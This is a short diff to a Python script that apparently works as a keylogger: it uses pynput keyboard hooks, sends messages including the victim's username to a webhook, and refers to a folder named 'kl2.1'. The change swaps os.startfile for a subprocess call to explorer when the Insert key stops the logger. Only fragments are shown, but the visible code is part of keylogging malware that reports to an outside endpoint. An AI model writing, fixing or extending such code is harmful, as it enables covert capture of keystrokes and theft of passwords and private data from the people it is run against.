@@ -1,6 +1,7 @@
 import os
 import requests
 import threading
+import subprocess
 import time
 from pynput import keyboard
 
@@ -74,7 +75,7 @@ def on_release(key):
     if key == keyboard.Key.insert:
         send_to_webhook(f"Connection stopped by user: {username}")
         file_path = r"C:\Users\{username}\kl2.1"  # Fixed the file path
-        os.startfile(file_path)
+        subprocess.run(["explorer", file_path])
         send_to_webhook(f"Opened dir...")
         return False
 
